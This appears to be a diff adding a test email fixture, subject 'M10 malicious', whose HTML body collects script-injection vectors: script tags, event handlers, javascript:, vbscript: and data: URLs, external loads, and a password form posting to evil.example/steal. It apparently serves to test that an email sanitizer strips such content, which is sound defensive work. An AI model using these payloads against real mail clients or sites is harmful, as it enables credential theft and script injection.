@@ -1,0 +1,8 @@
+From: "Example Sender" <sender@example.com>
+To: reader@example.org
+Date: Mon, 23 Nov 2026 09:00:00 +0000
+MIME-Version: 1.0
+Subject: M10 malicious
+Content-Type: text/html; charset=utf-8
+
+<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css"><style>@import url(https://evil.example/i.css); body{background:url(javascript:alert(1))}</style><script>document.title="pwned-script"</script></head><body onload="document.title='pwned-onload'"><p>Safe text</p><img src="x" onerror="document.title='pwned-onerror'"><a href="javascript:document.title='pwned-link'">click</a><a href="vbscript:msgbox(1)">vb</a><form action="https://evil.example/steal" method="post"><input name="password"><button>Send</button></form><iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object><embed src="https://evil.example/e"><svg onload="document.title='pwned-svg'"><script>document.title="pwned-svg2"</script></svg><a href="data:text/html,<script>alert(1)</script>">data link</a><img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+"></body></html>
